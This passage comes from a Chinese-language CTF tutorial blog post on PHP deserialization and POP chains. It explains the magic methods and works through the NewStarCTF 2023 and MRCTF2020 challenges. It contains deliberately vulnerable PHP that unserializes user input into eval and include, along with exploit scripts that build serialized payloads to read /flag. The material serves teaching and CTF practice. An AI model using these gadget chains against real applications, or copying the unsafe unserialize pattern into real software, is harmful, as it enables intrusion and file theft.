//在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据（比如访问private属性或者不存在的属性的值时）或者不存在这个键（$this-&gt;str[&#x27;str&#x27;]-&gt;source）都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发（输出一个对象、属性，将对象或属性与字符串拼接，对对象或属性进行正则匹配）</span><br><span class="line">__invoke() //当尝试将对象（属性）调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><p>会发现，我在很多魔法函数的触发方式的解释中对象后面都加了（属性），这与 php 官方手册和其他博客文章的解释有些许不同，在查找资料时产生了很多疑惑，比如我翻阅的其中一篇博客：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png" alt="5fd161f2f08ca123a0c6ccd8f4cc17cd.png"></p><p>原文说此处触发了 <code>__toString</code>  函数，可明明只是将属性当作字符串，</p><p>再比如同一篇文章的另一处：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png" alt="28258fc1d508554e89f8f7d99d3855b1.png"></p><p>触发了 <code>__invoke</code>  函数</p><p>在与小伙伴讨论之后，认为可以将属性看作对象</p><p>在弄清楚各种魔法函数触发条件之后就要开始构建 pop 链了</p><h4 id="pop链"><a class="markdownIt-Anchor" href="#pop链">#</a> POP 链</h4><p>POP 链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的 POP 链就显而易见了。CTF 赛中一般尾部就是 get flag 的方法，头部则是 GET/POST 传参</p><p>举个例子：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) // 1. <span class="title">destruct</span>函数为<span class="title">pop</span>链头</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source=<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source; <span class="comment">//输出变量，把类当作字符串，触发__toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) // 2</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source; <span class="comment">//访问不存在的属性，触发_get</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; <span class="comment">// 3 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getshell</span>(<span class="variable">$this</span>-&gt;params); <span class="comment">//直接调用getshell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getshell</span>(<span class="params"><span class="variable">$value</span></span>)  // 4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;params); <span class="comment">//尾，输出</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; <span class="comment">//GET传参头</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>先找链子的头和尾，头部明显是 GET 传参，尾部是 <code>Uwant</code>  类中的 <code>getshell</code> ，然后往上倒推， <code>Uwant</code>  类中的 <code>__get()</code>  中调用了 <code>getshell</code> ， <code>Show</code>  类中的 <code>toString</code>  调用了 <code>__get()</code> ，然后 <code>Hello</code>  类中的 <code>__destruct()</code> ，而我们 GET 传参之后会先进入 <code>__destruct()</code> ，这样子头和尾就连上了，所以说完整的链子就是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uwant</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Uwant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><h4 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h4><h5 id="newstarctf-2023-week3-pop-gadget"><a class="markdownIt-Anchor" href="#newstarctf-2023-week3-pop-gadget">#</a> newstarctf 2023 week3 | POP Gadget</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) //对象被销毁时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>; <span class="comment">//将对象当作字符串，可以触发__toString</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) //把对象当作字符串时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(); <span class="comment">//把对象当作方法（函数），触发__invoke</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>) //调用不可访问的方法时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>(); <span class="comment">//调用end函数</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) //将对象调用为函数时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>(); <span class="comment">//不存在getStr方法，触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) //错误的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>) // 正确的<span class="title">end</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log); <span class="comment">//handle-&gt;log不可访问，触发__unset</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>) //在不可访问的属性上使用<span class="title">unset</span>(<span class="params"></span>)时触发</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>); <span class="comment">//可以构造执行系统命令,比如:system(ls /)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); </span><br></pre></td></tr></table></figure></div><p>由此可以构造出 POP 链子</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br></pre></td></tr></table></figure></div><p>由于链子调用中成员属性有 private 和 protected，用 construct 方法去调用链子，最后再使用 url 编码绕过</p><p>exp</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func= <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;    </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)    </span></span><br><span class="line"><span class="function">    </span>&#123;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div><p>稍微总结一下，POP 链的头一般是 GET/POST 传参引发 <code>__wakeup</code>  ,  <code>__construct</code>  ,  <code>__destruct</code></p><p>结尾一般是输出敏感信息或者执行系统命令所在函数，即 GetFlag 的点</p><h5 id="mrctf2020ezpop1"><a class="markdownIt-Anchor" href="#mrctf2020ezpop1">#</a> [MRCTF2020]Ezpop1</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div><p>先找出可以 getflag 的点，在 <code>Modifier</code>  类中 <code>append</code>  函数有 <code>include</code>  函数可以文件包含，可以利用， <code>__invoke</code>  函数直接调用了 <code>append</code> ，在 Testlei 中 <code>__get</code>  将 p 作为函数调用，会触发 <code>__invoke</code> , 在 <code>__totring</code>  方法中 <code>$this-&gt;str</code>  赋予 <code>test</code>  类，在 <code>test</code>  类读取 <code>source</code>  变量，（因为 <code>test</code>  类中没有 <code>source</code>  属性，则是访问了不可访问的属性）则会自动调用 <code>__get</code>  魔术方法， <code>__wakeup</code>  函数将对象进行正则匹配，会触发 <code>__toString</code> ，而 <code>__wakeup</code>  在反序列化时会调用，可以当作 pop 链头，而尾时 <code>include</code>  函数，可以利用 <code>var</code>  构造 php 为协议获取 flag</p><p>pop 链：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show:__wakeup -&gt; Show:__toString -&gt; Test:__get -&gt; Modifier:__invoke -&gt;Modifier: append</span><br></pre></td></tr></table></figure></div><p>exp:</p><div 